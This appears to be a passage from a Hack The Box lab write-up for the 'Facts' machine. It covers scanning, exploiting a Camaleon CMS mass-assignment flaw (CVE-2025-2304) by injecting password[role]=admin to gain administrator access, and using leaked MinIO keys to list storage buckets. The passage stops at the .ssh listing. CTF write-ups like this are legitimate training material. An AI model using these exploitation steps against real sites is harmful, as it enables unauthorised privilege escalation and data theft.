[HTB: Facts](/2026/06/06/htb-facts.html)

![Facts](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/facts-cover.webp)

Facts is a Linux box hosting a trivia website built on the Camaleon CMS, a Ruby on Rails application. I’ll abuse a mass assignment vulnerability in Camaleon to promote my account to administrator, then use credentials from the admin panel to authenticate to a local MinIO S3 service. From the bucket I’ll grab an encrypted SSH private key, crack its passphrase with john, and SSH in as the next user. For root, I’ll abuse a sudo rule on facter, Puppet’s system inventory tool, that lets me load arbitrary Ruby code from a custom facts directory and run it as root. In Beyond Root, I’ll show an alternative foothold using a path traversal in Camaleon’s S3 uploader to read arbitrary files, and use the leaked Rails master key to decrypt the application’s encrypted credentials and session cookies.

## Box Info

[![Facts](/icons/box-facts.webp)](https://hackthebox.com/machines/facts)

[Facts](https://hackthebox.com/machines/facts)

Easy

Retire Date 06 Jun 2026

OS ![Linux](/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for Facts](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/facts-diff.webp)

Radar Graph ![Radar chart for Facts](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/facts-radar.webp)

User

00:15:52 Root

00:26:34 Creator ## Recon

### Initial Scanning

`nmap` finds three open TCP ports, SSH (22) and two HTTP (80, 54321):

```
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.244.96
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-28 01:19 UTC
Nmap scan report for 10.129.244.96
Host is up, received reset ttl 63 (0.022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
54321/tcp open  unknown syn-ack ttl 62

Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
oxdf@hacky$ sudo nmap -p 22,80,54321 -sCV 10.129.244.96
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-28 01:20 UTC
Nmap scan report for 10.129.244.96
Host is up (0.021s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  unknown
| fingerprint-strings:
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B396009572E4FA
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 28 May 2026 01:20:06 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18B396009572E4FA</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Thu, 28 May 2026 01:20:07 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.94SVN%I=7%D=5/28%Time=6A179847%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\
SF:nAccept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20
SF:application/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20ma
SF:x-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\
SF:x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\n
SF:X-Amz-Request-Id:\x2018B396009572E4FA\r\nX-Content-Type-Options:\x20nos
SF:niff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Thu,\x2028\x2
SF:0May\x202026\x2001:20:06\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20en
SF:coding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid
SF:\x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><
SF:RequestId>18B396009572E4FA</RequestId><HostId>dd9025bab4ad464b049177c95
SF:eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOption
SF:s,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Thu,\x2028\
SF:x20May\x202026\x2001:20:07\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(R
SF:TSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.29 seconds
```

Based on the [OpenSSH and Nginx](about:/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 25.04 Plucky.

There’s one additional hop to get to the webserver on port 54321:

```
oxdf@hacky$ sudo lft 10.129.244.96:80
Tracing ...T
TTL LFT trace to 10.129.244.96:80/tcp
 1  10.10.14.1 20.4ms
 2  [target open] 10.129.244.96:80 21.1ms
oxdf@hacky$ sudo lft 10.129.244.96:54321
Tracing .....T
TTL LFT trace to 10.129.244.96:54321/tcp
 1  10.10.14.1 20.9ms
 2  10.129.244.96 20.8ms
 3  [target open] 10.129.244.96:54321 22.0ms
```

That implies it’s running in a container.

The other two ports show a TTL of 63, which matches the [expected TTL](about:/cheatsheets/os#os-identification) for Linux one hop away.

There’s a redirect to `facts.htb` on port 80. I’ll use `ffuf` to bruteforce for subdomains that respond differently, but not find any. I’ll update my `hosts` file:

```
10.129.244.96 facts.htb
```

I’ll rescan ports 80 and 54321 by hostname rather than IP, but not find anything interesting.

The response headers on 54321 are interesting:

```
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B3968ACF933232
```

These are Amazon headers.

### Website - TCP 80

#### Site

The site is a trivia site:

 ![image-20260528201432333](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528201432333.webp)![expand](/icons/expand.png)

Clicking “Start Exploring” leads to a fact page:

![image-20260528201538512](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528201538512.webp)

There’s a search bar that leads to `/search?q=<input>`:

![image-20260528201606723](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528201606723.webp)

In the page footer there’s an email address, `contact@facts.htb`.

#### Tech Stack

The HTTP response headers show Nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Thu, 28 May 2026 14:11:28 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
plugin_front_cache: TRUE
etag: W/"ec7b9f9ae05e9e7a916fd89aef94bdbe"
cache-control: max-age=0, private, must-revalidate
set-cookie: _factsapp_session=EqcReSnq8LzlTyqcrCPC6vaFop1IY11%2Bv3AoEQIXgb7IcPl3BgBIhIKgtHyCMETEJpeu2qGfN2kWlJCQI4jKE3EQJhaGmXRRpQN%2Bwbtu%2FG%2FB8UcFv98jVxtK7qRLiNSS2YTn9c4wMc5PrT9JqyQm3DZUajxpQ%2BvtZh9DMR19F%2BDtnEzLTIoZOwHQUJhcLs1Yji5zzqafBkPQgmii5zmIM%2FvWqcWJHVu87LzlHuGIUNsbwVwvs7nRRvrOL%2FzYKPgDckkuKrURtVrBKkaWslZNbWfxf2BNl2L2aA%3D%3D--xoveJn%2BSqkJ9L2hb--lzt8APnecnCsWeOIfnf0tQ%3D%3D; path=/; httponly; samesite=lax
x-request-id: 3c289058-124e-437b-9f0a-5c99fd0733b5
x-runtime: 0.038416
Content-Length: 11098
```

There’s a cookie set, `_factsapp_session`. It’s URL-encoded, and the decode matches the format for a Ruby on Rails encrypted session cookie:

```
EqcReSnq8LzlTyqcrCPC6vaFop1IY11%2Bv3AoEQIXgb7IcPl3BgBIhIKgtHyCMETEJpeu2qGfN2kWlJCQI4jKE3EQJhaGmXRRpQN%2Bwbtu%2FG%2FB8UcFv98jVxtK7qRLiNSS2YTn9c4wMc5PrT9JqyQm3DZUajxpQ%2BvtZh9DMR19F%2BDtnEzLTIoZOwHQUJhcLs1Yji5zzqafBkPQgmii5zmIM%2FvWqcWJHVu87LzlHuGIUNsbwVwvs7nRRvrOL%2FzYKPgDckkuKrURtVrBKkaWslZNbWfxf2BNl2L2aA%3D%3D--xoveJn%2BSqkJ9L2hb--lzt8APnecnCsWeOIfnf0tQ%3D%
```

The give-away is the three sections separated by `--`:

```
<ciphertext>--<iv>--<auth_tag>
```
- Part 1 (long): AES-256-GCM encrypted session payload (a Marshal/JSON-serialized Ruby hash)
- Part 2 xoveJn+SqkJ9L2hb (12 bytes): the GCM IV/nonce
- Part 3 lzt8APnecnCsWeOIfnf0tQ== (16 bytes): the GCM authentication tag

`/index.*` gives the index page, and the 404 page shows as part of the framework:

![image-20260528202203341](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528202203341.webp)

Wappalyzer doesn’t add anything:

![image-20260528202234546](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528202234546.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```
oxdf@hacky$ feroxbuster -u http://facts.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  \`    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://facts.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      121l      443w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      124l      552w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
200      GET       69l      448w    30396c http://facts.htb/randomfacts/logopage2.png
200      GET       66l      519w    44082c http://facts.htb/randomfacts/primary-question-mark.png
404      GET        2l        9w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c http://facts.htb/randomfacts/
404      GET        2l       11w      353c http://facts.htb/randomfacts/Reports%20List
404      GET        2l       11w      357c http://facts.htb/randomfacts/external%20files
200      GET      271l     1166w    19187c http://facts.htb/search
404      GET        2l       11w      355c http://facts.htb/randomfacts/Style%20Library
200      GET      281l     1177w    19593c http://facts.htb/page
404      GET        2l       11w      349c http://facts.htb/randomfacts/modern%20mom
404      GET        2l       13w      359c http://facts.htb/randomfacts/neuf%20giga%20photo
404      GET        2l       11w      357c http://facts.htb/randomfacts/Web%20References
404      GET        2l       11w      349c http://facts.htb/randomfacts/My%20Project
404      GET        2l       11w      349c http://facts.htb/randomfacts/Contact%20Us
404      GET        2l       11w      351c http://facts.htb/randomfacts/Donate%20Cash
404      GET        2l       11w      347c http://facts.htb/randomfacts/Home%20Page
404      GET        2l       11w      357c http://facts.htb/randomfacts/Planned%20Giving
404      GET        2l       11w      357c http://facts.htb/randomfacts/Press%20Releases
404      GET        2l       11w      357c http://facts.htb/randomfacts/Privacy%20Policy
404      GET        2l       11w      345c http://facts.htb/randomfacts/Site%20Map
404      GET        2l       11w      345c http://facts.htb/randomfacts/About%20Us
404      GET        2l       11w      353c http://facts.htb/randomfacts/Bequest%20Gift
404      GET        2l       11w      347c http://facts.htb/randomfacts/Gift%20Form
404      GET        2l       13w      361c http://facts.htb/randomfacts/Life%20Income%20Gift
404      GET        2l       11w      349c http://facts.htb/randomfacts/New%20Folder
404      GET        2l       11w      351c http://facts.htb/randomfacts/Site%20Assets
404      GET        2l       13w      351c http://facts.htb/randomfacts/What%20is%20New
200      GET        1l        4w       73c http://facts.htb/up
404      GET      114l      371w     4836c http://facts.htb/~
200      GET        1l        2w       33c http://facts.htb/robots
404      GET      114l      371w     4836c http://facts.htb/Reports%20List
200      GET      114l      574w     7918c http://facts.htb/500
404      GET      114l      371w     4836c http://facts.htb/external%20files
404      GET      114l      371w     4836c http://facts.htb/%7D
404      GET      114l      371w     4836c http://facts.htb/Style%20Library
404      GET      114l      371w     4836c http://facts.htb/~joe
200      GET      114l      532w     6685c http://facts.htb/400
404      GET      114l      371w     4836c http://facts.htb/modern%20mom
404      GET      114l      371w     4836c http://facts.htb/neuf%20giga%20photo
404      GET      114l      371w     4836c http://facts.htb/%E2%80%8E
404      GET      114l      371w     4836c http://facts.htb/[
404      GET      114l      371w     4836c http://facts.htb/plain]
404      GET      114l      371w     4836c http://facts.htb/fixed!
404      GET      114l      371w     4836c http://facts.htb/Anv%C3%A4ndare
404      GET      114l      371w     4836c http://facts.htb/!ut
404      GET      114l      371w     4836c http://facts.htb/!
404      GET      114l      371w     4836c http://facts.htb/Web%20References
404      GET      114l      371w     4836c http://facts.htb/My%20Project
404      GET      114l      371w     4836c http://facts.htb/]
404      GET      114l      371w     4836c http://facts.htb/~chris
404      GET      114l      371w     4836c http://facts.htb/Contact%20Us
404      GET      114l      371w     4836c http://facts.htb/~a
404      GET      114l      371w     4836c http://facts.htb/~admin
404      GET      114l      371w     4836c http://facts.htb/~site
404      GET      114l      371w     4836c http://facts.htb/%D7%99%D7%9D
404      GET      114l      371w     4836c http://facts.htb/!_archives
404      GET      114l      371w     4836c http://facts.htb/!_images
404      GET      114l      371w     4836c http://facts.htb/!backup
404      GET      114l      371w     4836c http://facts.htb/!images
404      GET      114l      371w     4836c http://facts.htb/!res
404      GET      114l      371w     4836c http://facts.htb/!textove_diskuse
404      GET      114l      371w     4836c http://facts.htb/Donate%20Cash
404      GET      114l      371w     4836c http://facts.htb/Home%20Page
404      GET      114l      371w     4836c http://facts.htb/Planned%20Giving
404      GET      114l      371w     4836c http://facts.htb/Press%20Releases
404      GET      114l      371w     4836c http://facts.htb/Privacy%20Policy
404      GET      114l      371w     4836c http://facts.htb/Site%20Map
404      GET      114l      371w     4836c http://facts.htb/~images
404      GET      114l      371w     4836c http://facts.htb/~mike
404      GET      114l      371w     4836c http://facts.htb/~r
404      GET      114l      371w     4836c http://facts.htb/~sys~
404      GET      114l      371w     4836c http://facts.htb/%E9%99%A4%E5%80%99%E9%80%89
404      GET      114l      371w     4836c http://facts.htb/%E9%99%A4%E6%8A%95%E7%A5%A8
404      GET      114l      371w     4836c http://facts.htb/%E4%BE%B5%E6%9D%83
200      GET      114l      602w     8380c http://facts.htb/422
404      GET      114l      371w     4836c http://facts.htb/quote]
404      GET      114l      371w     4836c http://facts.htb/!old
404      GET      114l      371w     4836c http://facts.htb/!upload
404      GET      114l      371w     4836c http://facts.htb/About%20Us
404      GET      114l      371w     4836c http://facts.htb/Bequest%20Gift
404      GET      114l      371w     4836c http://facts.htb/Dirk-M%C3%BCller
404      GET      114l      371w     4836c http://facts.htb/Thomas-Sch%C3%B6ll
404      GET      114l      371w     4836c http://facts.htb/Gift%20Form
404      GET      114l      371w     4836c http://facts.htb/Life%20Income%20Gift
404      GET      114l      371w     4836c http://facts.htb/New%20Folder
404      GET      114l      371w     4836c http://facts.htb/Site%20Assets
404      GET      114l      371w     4836c http://facts.htb/What%20is%20New
404      GET      114l      371w     4836c http://facts.htb/a0%7D
404      GET        1l        3w       14c http://facts.htb/cable
404      GET      114l      371w     4836c http://facts.htb/error%1F_log
404      GET      114l      371w     4836c http://facts.htb/extension]
404      GET      114l      371w     4836c http://facts.htb/~blog
404      GET      114l      371w     4836c http://facts.htb/~alex
404      GET      114l      371w     4836c http://facts.htb/~chat
404      GET      114l      371w     4836c http://facts.htb/~css
404      GET      114l      371w     4836c http://facts.htb/~eric
404      GET      114l      371w     4836c http://facts.htb/~forum
404      GET      114l      371w     4836c http://facts.htb/~gary
404      GET      114l      371w     4836c http://facts.htb/~home
404      GET      114l      371w     4836c http://facts.htb/~js
404      GET      114l      371w     4836c http://facts.htb/~liam
404      GET      114l      371w     4836c http://facts.htb/~mark
404      GET      114l      371w     4836c http://facts.htb/~tmp
404      GET      114l      371w     4836c http://facts.htb/%C4%BC
404      GET      114l      371w     4836c http://facts.htb/%CC%A8%C4%BC
404      GET      114l      371w     4836c http://facts.htb/%C5%B1%C4%BC
404      GET      114l      371w     4836c http://facts.htb/%C4%A3%C4%BC
404      GET      114l      371w     4836c http://facts.htb/%DD%BF%C4%BC
404      GET      114l      371w     4836c http://facts.htb/%E2%80%9D
404      GET      114l      371w     4836c http://facts.htb/%E7%89%B9%E6%AE%8A
404      GET      114l      371w     4836c http://facts.htb/%E8%AE%A8%E8%AE%BA
404      GET      114l      371w     4836c http://facts.htb/[0-9]
[####################] - 34m    60030/60030   0s      found:112     errors:770
[####################] - 34m    30000/30000   15/s    http://facts.htb/
[####################] - 2m     30000/30000   296/s   http://facts.htb/randomfacts/
```

The most interesting find is `/admin`.

#### Admin Panel

Visiting presents a login page:

![image-20260528205134063](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528205134063.webp)

The page source shows references to [Camaleon CMS](https://github.com/owen2345/camaleon-cms):

![image-20260528205236869](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528205236869.webp)

I’ll click the “Create an account” link:

![image-20260528205412379](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528205412379.webp)

On submitting, it redirects back to the login with a message saying my account was created, and I’ll login:

![image-20260528205740472](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528205740472.webp)

It doesn’t give access to any admin features, but it confirms it’s Camaleon and the version is 2.9.0.

I can access my user profile via the menu at the top right.

![image-20260530065937827](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260530065937827.webp)

The “Role” field is interesting. I can’t click on it because it’s disabled in the HTML:

![image-20260530070337136](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260530070337136.webp)

I can edit that HTML in the dev tools to remove the `disabled="disabled"`, and it becomes active on the page:

![image-20260530070423021](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260530070423021.webp)

I’ll change it to Administrator and it shows up in the POST body (seen here in Burp Proxy):

![image-20260530070607833](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260530070607833.webp)

Unfortunately, nothing changes on the page return. There must be server-side validation happening.

### MinIO - TCP 54321

Visiting `/` returns a 307 redirect to port 9001:

```
HTTP/1.1 307 Temporary Redirect
Content-Type: text/html; charset=utf-8
Location: http://facts.htb:9001
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 18B3C019B4AABD5C
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Date: Thu, 28 May 2026 14:11:34 GMT
Content-Length: 57
```

It has the Amz headers, which are Amazon S3 fingerprints. Given HTB machines don’t have internet access, this is almost certainly some local version, like OpenStack or MinIO. Visiting `/0xdf` to look for a 404 page shows the result:

![image-20260528211204194](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260528211204194.webp)

The headers show the `Server` is [MinIO](https://min.io/):

```
HTTP/1.1 400 Bad Request
Accept-Ranges: bytes
Content-Length: 281
Content-Type: application/xml
Server: MinIO
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 18B3E41319D2C671
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Date: Fri, 29 May 2026 01:10:48 GMT

<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>InvalidBucketName</Code><Message>The specified bucket is not valid.</Message><Resource>/v1</Resource><RequestId>18B3E41319D2C671</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
```

[MinIO](https://min.io/) is an open-source, S3-compatible object storage server written in Go. It speaks the same HTTP API as Amazon S3 (including the same XML error bodies and `x-amz-*` response headers). It’s commonly self-hosted as a drop-in S3 backend for apps that want to store assets, backups, or uploads without depending on AWS. It ships with a web console on TCP 9001 (which explains the redirect on `:54321/` to `:9001`) for managing buckets, users, and policies.

## Shell as trivia

### MinIO Authentication

#### Identify CVE

[Camaleon 2.9.0](https://github.com/owen2345/camaleon-cms/releases/tag/2.9.0) was released on GitHub on 6 Jan 2025:

![image-20260529092615776](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260529092615776.webp)

Just over two months later, [2.9.1 released](https://github.com/owen2345/camaleon-cms/releases/tag/2.9.1):

![image-20260529092648942](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260529092648942.webp)

There are two critical security bugs:

1. There’s a mass assignment privesc vulnerability.
2. XSS attacks in fields, comments, and metas.

The first one is the more interesting one, and it’s [CVE-2025-2304](https://nvd.nist.gov/vuln/detail/CVE-2025-2304). There’s actually another CVE that wasn’t public at the time of Facts’ release. I’ll look at CVE-2024-46987 / CVE-2026-1776 in [Beyond Root](#beyond-root---alternative-foothold).

#### CVE-2025-2304 Background

NIST describes [CVE-2025-2304](https://nvd.nist.gov/vuln/detail/CVE-2025-2304) as:

> A Privilege Escalation through a Mass Assignment exists in Camaleon CMS When a user wishes to change his password, the ‘updated\_ajax’ method of the UsersController is called. The vulnerability stems from the use of the dangerous permit! method, which allows all parameters to pass through without any filtering.

This vulnerability was originally [reported by Tenable](https://www.tenable.com/security/research/tra-2025-09). Their writeup doesn’t give a ton of info, but does have the vulnerable code:

```ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)
  render inline: @user.errors.full_messages.join(', ')

  # keep user logged in when changing their own password
  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```

The `.permit!` method allows all parameters to pass through without filtering.

#### Exploit

All of the requests involving the user use this `user[<field>]` structure in POST requests. The body on a login looks like:

```
authenticity_token=PYE9ch3BeagDhFEpkOCvUkbjbpun6zj5mf0uwUHdi-hgb5MdiGWFFbsN5jfYzVH3D0mX9t7XPQh2LIWse9-1dQ&user%5Busername%5D=0xdf&user%5Bpassword%5D=0xdf
```

Which URL-decodes to:

```
authenticity_token=PYE9ch3BeagDhFEpkOCvUkbjbpun6zj5mf0uwUHdi-hgb5MdiGWFFbsN5jfYzVH3D0mX9t7XPQh2LIWse9-1dQ&user[username]=0xdf&user[password]=0xdf
```

This same pattern is in the profile update, where I tried (and failed) to update my role. That request does show how I would set a user’s role to administrator. The `authentication_token` looks like another Ruby-encrypted blob.

The mass assignment vulnerability is in the `updated_ajax` according to the vulnerability. The source also shows that the `password` parameter is required, which makes sense that it would be the password update function. When I check Burp for the HTTP POST request for that action, it matches (URL-decoded here for readability):

```
POST /admin/users/5/updated_ajax HTTP/1.1
Host: facts.htb
...[snip]...

_method=patch&authenticity_token=wluEPR6dBpl1Zk3IKgHoEduQyOcOlO97M1Lznq7vYR8ifkDQDARN9yrvSoj7v1NM6d8kYnfFarLk80U0eHplyQ&password[password]=qwe&password[password_confirmation]=qwe
```

In the source, the line `@user.update(params.require(:password).permit!)` says get the `password` object from the parameters and apply all its fields to the `user` object. So if I add `password[role]=admin`, that will apply to my account. I’ll turn on intercept in Burp Proxy, send a password change request, and add that to the end of the body:

![image-20260530072254151](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260530072254151.webp)

After I let that continue, on refreshing my browser, there’s a lot more in the menu bar:

![image-20260530072326198](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260530072326198.webp)

#### Admin Enumeration

Digging around in the admin pages, a lot of the pages are mostly empty. However, under Settings –> General Site –> Filesystem Settings, the site is configured to use AWS for storage:

![image-20260530101846992](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260530101846992.webp)

It lists the connection information to manage AWS, pointing at MinIO on 54321, and providing auth.

### SSH Access

#### MinIO Enumeration

I’ll use the AWScli (`uv tool install awscli`) to enumerate the buckets on MinIO. I’ll create a profile using the auth from the CMS admin panel:

```
oxdf@hacky$ aws configure --profile facts.htb
AWS Access Key ID [None]: AKIA3ADAF4DE0BB0FAA2
AWS Secret Access Key [None]: h4ORDGfkO/GT7pfj/r5Wc9Xa4Girqz59RHABlM4I
Default region name [None]: us-east-1
Default output format [None]: json
```

Now I can list the buckets:

```
oxdf@hacky$ aws s3 ls --profile facts.htb --endpoint-url http://facts.htb:54321
2025-09-11 12:06:52 internal
2025-09-11 12:06:52 randomfacts
```

I can also add the endpoint URL to the profile:

```
oxdf@hacky$ aws configure set endpoint_url http://facts.htb:54321 --profile facts.htb
oxdf@hacky$ aws s3 ls --profile facts.htb 
2025-09-11 12:06:52 internal
2025-09-11 12:06:52 randomfacts
```

I can also save the profile in an environment variable:

```
oxdf@hacky$ export AWS_PROFILE=facts.htb
oxdf@hacky$ aws s3 ls 
2025-09-11 12:06:52 internal
2025-09-11 12:06:52 randomfacts
```

There are two buckets.

The `randomfacts` bucket has the same images from the website:

```
oxdf@hacky$ aws s3 ls randomfacts
                           PRE private/
                           PRE thumb/
2026-05-30 10:59:56      49946 0xdf.png
2025-09-11 12:07:06     446847 animalejected.png
2025-09-11 12:07:06     271210 annefrankasteroid.png
2025-09-11 12:07:06     255778 catsattachment.png
2025-09-11 12:07:05     411597 cuteanimals.png
2025-09-11 12:07:05     177331 darkchocolate.png
2025-09-11 12:07:05     312753 dogscatssmell.png
2025-09-11 12:07:04     922561 dolphinfact.png
2025-09-11 12:07:04      67352 finlandhappiest.png
2025-09-11 12:07:04     388178 firstimpressions.png
2025-09-11 12:07:04     100689 firsttransaction.png
2025-09-11 12:07:03     222436 firstwebcam.png
2025-09-11 12:07:03     128158 georgewashingtonslaves.png
2025-09-11 12:07:03      34816 logopage.png
2025-09-11 12:07:03      16886 logopage2.png
2025-09-11 12:07:02      80796 pressureupbeat.png
2025-09-11 12:07:02      24792 primary-question-mark.png
2025-09-11 12:07:02     341284 smallanimals.png
2025-09-11 12:07:02     332397 superiorpeople.png
2025-09-11 12:07:01      39579 vanilla.png
2025-09-11 12:07:01      35769 youtubewatchhours.png
```

`internal` is much more interesting, looking like a home directory:

```
oxdf@hacky$ aws s3 ls internal
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 18:45:13        220 .bash_logout
2026-01-08 18:45:13       3900 .bashrc
2026-01-08 18:47:17         20 .lesshst
2026-01-08 18:47:17        807 .profile
```

`.ssh` has a private key:

```
oxdf@hacky$ aws s3 ls internal/.ssh/
2026-05-28 01:18:01         82 authorized_keys
